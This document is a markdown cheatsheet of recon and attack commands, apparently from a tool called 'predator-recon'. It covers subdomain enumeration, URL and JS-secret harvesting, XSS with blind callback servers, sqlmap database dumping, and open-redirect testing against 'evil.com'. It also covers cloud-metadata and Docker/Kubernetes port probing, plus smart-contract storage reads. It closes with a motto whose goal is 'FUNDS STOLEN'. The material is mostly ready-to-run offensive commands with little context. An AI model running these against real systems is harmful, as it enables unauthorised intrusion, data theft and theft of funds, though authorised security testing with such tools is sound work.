# RECON CHEATSHEET — Quick Reference
# Generated by predator-recon v2.0 sync-ref

## SUBDOMAIN ENUMERATION

### Passive (no DNS queries to target)
```bash
subfinder -d target.com -all -o subs.txt
assetfinder --subs-only target.com | anew subs.txt
amass enum -passive -d target.com -o amass.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | anew subs.txt
python3 github-subdomains.py -t $GH_TOKEN -d target.com | anew subs.txt
```

### Active (bruteforce)
```bash
puredns bruteforce ~/wordlists/best-dns-wordlist.txt target.com -r ~/resolvers.txt | anew subs.txt
ffuf -u "https://FUZZ.target.com" -w ~/wordlists/best-dns-wordlist.txt -mc 200,301,302,403,401
```

### Merge & Resolve
```bash
cat subs.txt | puredns resolve -r ~/resolvers.txt -w resolved.txt
cat resolved.txt | httpx -silent -mc 200,301,302,403,401 -title -tech-detect -o live.txt
```

## URL & PARAM HARVEST
```bash
waymore -i target.com -mode U -oU urls.txt
gau target.com | anew urls.txt
katana -u https://target.com -jc -kf all -silent | anew urls.txt
cat urls.txt | uro | anew urls-dedup.txt
cat urls-dedup.txt | httpx -silent -mc 200 -o live-urls.txt
cat live-urls.txt | grep "=" | anew params.txt
cat urls-dedup.txt | grep "\.js$" | httpx -mc 200 | anew js-files.txt
```

## JS HUNTING
```bash
cat js-files.txt | jscracker | anew js-secrets.txt
nuclei -l js-files.txt -t exposures/ -t fuzzing/ -silent -o nuclei-js.txt
```

## VULN SCANNING
### XSS
```bash
cat params.txt | Gxss -c 100 -p XssReflected | dalfox pipe -b $XSS_SERVER -w 100
cat params.txt | dalfox pipe -b https://xss.server -blind
```
### SQLi
```bash
sqlmap -m params.txt --batch --random-agent --level 1 --tamper=space2comment --dbs
```
### CORS
```bash
cat live-urls.txt | CORS-Scanner
```
### Redirect
```bash
cat urls.txt | grep -E "(url|redirect|next|return|goto)=http" | qsreplace "https://evil.com" | \
  while read url; do curl -s -L "$url" -I | grep -i "evil.com" && echo "$url"; done
```
### SSRF
```bash
nuclei -l live-urls.txt -t ssrf/ -silent -o ssrf.txt
```
### Takeover
```bash
nuclei -l live.txt -t takeovers/ -silent -o takeover.txt
subzy run --targets live.txt | anew takeover.txt
```
### Nuclei (all)
```bash
nuclei -l live-urls.txt -t vulnerabilities/ -t cves/ -t exposures/ -t misconfiguration/ \
  -t fuzzing-templates/ -t ssl/ -t dns/ -rate-limit 100 -severity critical,high,medium -silent
```

## INFRA
```bash
naabu -rate 10000 -l live.txt -top-ports 1000 -silent -o ports.txt
for ip in $(cat live-ips.txt); do
  for ep in "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/computeMetadata/v1/"; do
    curl -s -m 2 -H "Metadata-Flavor: Google" "$ep" && echo "$ip: $ep"
  done
done
for port in 10250 10255 2375 2376 6443 8443; do
  timeout 2 bash -c "cat < /dev/null > /dev/tcp/$ip/$port" && echo "$ip:$port (k8s/docker)"
done
```

## ONCHAIN
```bash
cast code $CONTRACT --rpc-url $RPC
for i in {0..49}; do cast storage $CONTRACT $i --rpc-url $RPC; done
cast call $CONTRACT "owner()(address)" --rpc-url $RPC
cast call $CONTRACT "paused()(bool)" --rpc-url $RPC
cast call $CONTRACT "getReserves()(uint112,uint112,uint32)" --rpc-url $RPC
cast balance $CONTRACT --rpc-url $RPC
```

## CALCULUS QUICK
```
Value > Cost + Risk + Irreversibility? → GO | Else → PIVOT or ABORT
```

## BLIND SPOT (Post-Phase)
1. What did I NOT look at?
2. What would devs expect me to miss?
3. If I'm wrong, where?

## REMEMBER
**Tools don't find bugs. The loop finds bugs.**
*"Eliminate → Trace → Walk → Loop until TX HASH / WEAK PROVEN / FUNDS STOLEN."*
